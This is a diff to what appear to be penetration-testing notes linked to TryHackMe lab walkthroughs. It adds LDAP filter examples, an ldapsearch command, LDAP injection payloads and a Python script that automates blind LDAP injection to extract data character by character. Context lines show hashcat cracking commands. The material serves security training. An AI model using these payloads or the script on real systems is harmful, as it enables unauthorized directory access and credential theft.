@@ -26,6 +26,46 @@ wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/mast
 
 ## Information Gathering
 
+### Search Queries
+
+**Examples**
+
+[#search-queries](../../walkthroughs/tryhackme/ldap-injection.md#search-queries "mention")
+
+#### Filter Examples
+
+**Simple Filter:**
+
+```default
+(cn=John Doe)
+```
+
+This filter targets entries with a canonical name (`cn`) exactly matching "John Doe".
+
+**Wildcards:**
+
+```php
+(cn=J*)
+```
+
+This filter applies the wildcard operator to match any entry where the `cn` begins with "J", regardless of what follows.
+
+**Complex Filters with Logical Operators:**
+
+For a more complex search query, filters can be used with each other using logical operators such as AND (`&`), OR (`|`), and NOT (`!`).
+
+```default
+(&(objectClass=user)(|(cn=John*)(cn=Jane*)))
+```
+
+**Sample Search Query using ldapsearch**
+
+```shell-session
+ldapsearch -x -H ldap://$VICTIM:389 -b "dc=ldap,dc=thm" "(ou=People)"
+```
+
+### Domain
+
 **Examples**
 
 [#active-directory-a-d-environment](../../walkthroughs/tryhackme/the-lay-of-the-land.md#active-directory-a-d-environment "mention")
@@ -279,12 +319,6 @@ bloodhound --no-sandbox
 <figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
-
-
-
-##
-
-
 
 ### AD Objects
 
@@ -548,11 +582,101 @@ hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyo.txt --force
 hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt --force --show
 ```
 
-##
+## LDAP Injection
+
+**Examples**
+
+[#exploiting-ldap](../../walkthroughs/tryhackme/ldap-injection.md#exploiting-ldap "mention")
+
+**Injected Username and Password:**
+
+```php
+username=*&password=*
+```
+
+### Blind LDAP Injection
+
+**Examples**
+
+[#blind-ldap-injection](../../walkthroughs/tryhackme/ldap-injection.md#blind-ldap-injection "mention")
+
+If the application returns "Something is wrong in your password", the attacker can infer that a user with an account that starts with "a" in their uid exists in the LDAP directory. To check for the next character, an attacker can reiterate the payload with the next character, for example:
+
+**Injected Username and Password:**
+
+```php
+username=ab*%29%28%7C%28%26&password=pwd%29
+```
+
+### Blind LDAP Injection Automation Example
+
+#### Exploit Code
+
+To automate the exfiltration of data in the previous task, you can use the Python script below:
+
+```python
+import requests
+from bs4 import BeautifulSoup
+import string
+import time
+
+# Base URL
+url = 'http://$VICTIM/blind.php'
+
+# Define the character set
+char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"
+
+# Initialize variables
+successful_response_found = True
+successful_chars = ''
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+while successful_response_found:
+    successful_response_found = False
+
+    for char in char_set:
+        #print(f"Trying password character: {char}")
+
+        # Adjust data to target the password field
+        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}
+
+        # Send POST request with headers
+        response = requests.post(url, data=data, headers=headers)
+
+        # Parse HTML content
+        soup = BeautifulSoup(response.content, 'html.parser')
+
+        # Adjust success criteria as needed
+        paragraphs = soup.find_all('p', style='color: green;')
+
+        if paragraphs:
+            successful_response_found = True
+            successful_chars += char
+            print(f"Successful character found: {char}")
+            break
+
+    if not successful_response_found:
+        print("No successful character found in this iteration.")
+
+print(f"Final successful payload: {successful_chars}")
+```
+
+**Kali**
+
+```shell-session
+python3 -m venv myenv
+source myenv/bin/activate
+pip3 install bs4
+pip3 install requests
+python3 script.py
+```
 
 ## AS-REP Roasting w/ Rubeus
 
-**Example**
+**Examples**
 
 [#as-rep-roasting-w-rubeus](../../walkthroughs/tryhackme/attacking-kerberos.md#as-rep-roasting-w-rubeus "mention")
 
